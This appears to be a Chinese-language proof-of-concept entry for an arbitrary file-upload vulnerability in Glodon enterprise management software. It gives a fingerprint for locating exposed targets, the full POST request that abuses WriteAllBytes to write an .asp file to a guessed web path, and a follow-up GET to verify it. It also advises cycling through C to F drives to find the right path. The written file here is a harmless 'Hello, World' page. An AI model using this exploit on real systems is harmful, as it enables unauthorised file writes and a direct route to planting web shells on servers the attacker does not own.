# 广联达WriteAllBytes任意文件上传漏洞

- **系统**：广联达WriteAllBytes　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="Glodon-企业管理产品"`
- **请求**：`POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=WriteAllBytes HTTP/1.1`

**请求体 / payload**
```
1、文件内容为ascii码列表：
Host:
Content-Type: application/json
["\"D:\\\\Program Files (x86)\\\\Glodon\\\\GTP\\\\data\\\\gtp-default\\\\FileStorage\\\\UserFiles\\\\qqtest.asp\"","[60, 37, 32, 82, 101, 115, 112, 111, 110, 115, 101, 46, 87, 114, 105, 116, 101, 40, 34, 72, 101, 108, 108, 111, 44, 32, 87, 111, 114, 108, 100, 34, 41, 32, 37, 62]","false"]
2、访问文件，验证上传效果:
GET /UserFiles/qqtest.asp HTTP/1.1
Host:
注意：此上传为文件写入上传，因此需要自己找网站物理路径，上述物理路径是多次实验取的大多数的通用路径，有个别站点物理路径不会上面的。建议遍历C、D、E、F盘进行上传。如果上传包响应里面出现“没有此路径”的关键字，说明大概率存在漏洞，只是物理路径没有给正确。
```
- **预期**：200　|　—